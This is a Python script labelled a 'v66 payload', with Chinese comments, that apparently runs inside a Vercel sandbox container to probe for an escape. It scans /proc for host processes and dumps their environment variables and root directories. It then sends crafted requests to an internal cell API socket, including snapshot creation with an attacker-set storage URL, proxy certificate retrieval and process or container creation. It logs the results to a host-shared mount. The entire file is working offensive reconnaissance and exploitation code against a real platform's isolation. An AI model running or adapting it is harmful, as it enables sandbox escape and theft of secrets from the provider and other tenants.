# -*- coding: utf-8 -*-
"""v66 payload: 容器内 cell API 全方法探测 + 宿主进程侦察 (无 pid ns 尝试)"""
import socket, time, os, re, struct

OUT = '/vercel/sandbox/v66c.out'
CSP = '/vercel.hive.cell.api.drives.v1.DrivesService/CreateSnapshot'


def log(s):
    line = '[%.3f] %s' % (time.time(), s)
    for p in (OUT, '/mnt/h/volumes/run/vercel/share/v66c2.out'):
        try:
            open(p, 'a', encoding='utf-8', errors='replace').write(line + '\n')
        except Exception:
            pass
    try:
        print(line, flush=True)
    except Exception:
        pass


def rpc(path, body='{}', t=3):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect('/run/cell/cell.sock')
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n%s' % (path, len(body), body))
        s.sendall(req.encode())
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:400].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def ps_probe():
    """枚举 /proc 找宿主导进程 (无 pid ns 时可见)"""
    seen = []
    try:
        for d in os.listdir('/proc'):
            if d.isdigit():
                try:
                    cmd = open('/proc/%s/cmdline' % d, 'rb').read().replace(b'\0', b' ').decode(errors='replace')[:160]
                except Exception:
                    cmd = ''
                cl = cmd.lower()
                if any(k in cl for k in ('vercel', 'cell', 'sandbox', 'containerd', 'runc', 'systemd', 'celld')):
                    seen.append((d, cmd))
    except Exception as e:
        log('ps_probe EXC %s' % e)
    for pid, cmd in seen:
        log('PS %s: %s' % (pid, cmd))
    for pid, cmd in seen:
        if any(k in cmd for k in ('sandboxctrl', 'sandbox-init', 'celld', 'containerd', 'systemd')):
            try:
                env = open('/proc/%s/environ' % pid, 'rb').read().replace(b'\0', b'\n').decode(errors='replace')
                log('--- ENV %s ---\n%s' % (pid, env[:2500]))
            except Exception as e:
                log('env %s EXC %s' % (pid, e))
            try:
                rt = os.listdir('/proc/%s/root' % pid)[:20]
                log('root %s: %s' % (pid, rt))
            except Exception as e:
                log('root %s EXC %s' % (pid, e))


def main():
    log('V66 payload start pid=%d' % os.getpid())
    log('cell sock: %s' % os.path.exists('/run/cell/cell.sock'))
    for p in ['/run/cell', '/run/vercel', '/run/vercel/share', '/run/containerd']:
        try:
            log('dir %s: %s' % (p, os.listdir(p)[:40]))
        except Exception as e:
            log('dir %s EXC %s' % (p, e))
    try:
        log('host share: %s' % os.listdir('/mnt/h/volumes/run/vercel/share')[:40])
    except Exception as e:
        log('host share EXC %s' % e)
    ps_probe()

    probes = [
        ('GetDrive', '/vercel.hive.cell.api.drives.v1.DrivesService/GetDrive', '{}'),
        ('ListDrives', '/vercel.hive.cell.api.drives.v1.DrivesService/ListDrives', '{}'),
        ('GetSnapshot', '/vercel.hive.cell.api.drives.v1.DrivesService/GetSnapshot', '{}'),
        ('ListSnapshots', '/vercel.hive.cell.api.drives.v1.DrivesService/ListSnapshots', '{}'),
        ('snap/empty', CSP, '{}'),
        ('snap/no-url', CSP, '{"drive_id":"sandbox"}'),
        ('snap/empty-url', CSP, '{"drive_id":"sandbox","base_url":""}'),
        ('snap/s3-127', CSP, '{"drive_id":"sandbox","base_url":"s3://127.0.0.1:18080/b/k"}'),
        ('snap/bad-drive', CSP, '{"drive_id":"nope","base_url":"s3://127.0.0.1:18080/b/k"}'),
        ('oci/empty', '/vercel.hive.cell.api.drives.v1.DrivesService/SetOCIImageConfig', '{}'),
        ('oci/drive', '/vercel.hive.cell.api.drives.v1.DrivesService/SetOCIImageConfig', '{"drive_id":"sandbox"}'),
        ('oci/ref', '/vercel.hive.cell.api.drives.v1.DrivesService/SetOCIImageConfig',
         '{"drive_id":"sandbox","oci_image_config":{"ref":"sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59"}}'),
        ('storage', '/vercel.hive.cell.api.celld.v1.CelldService/GetDriveStorageUsage', '{"drive_id":"sandbox"}'),
        ('cfg', '/vercel.hive.cell.api.celld.v1.CelldService/Configure', '{}'),
        ('setworkload', '/vercel.hive.cell.api.celld.v1.CelldService/SetWorkload', '{}'),
        ('oci-get', '/vercel.hive.cell.api.host.v1.HostService/GetOCIImageConfig', '{}'),
        ('proxy', '/vercel.hive.cell.api.host.v1.HostService/GetProxyCertificates', '{}'),
        ('host-snap', '/vercel.hive.cell.api.host.v1.HostService/CreateSnapshotUploading', '{}'),
        ('usage', '/vercel.hive.cell.api.usage.v1.UsageService/GetResourceUsage', '{}'),
        ('proc-start', '/vercel.hive.cell.api.process.v1.ProcessService/Start', '{}'),
        ('ctr-create', '/vercel.hive.cell.api.containers.v1.ContainersService/Create', '{}'),
    ]
    for name, path, body in probes:
        t0 = time.time()
        st, bd = rpc(path, body, t=3)
        dt = time.time() - t0
        log('%-12s -> %s (%.2fs) | %s' % (name, st, dt, bd[:180].replace('\n', ' ')))
        time.sleep(0.15)
    log('V66C_DONE')


main()
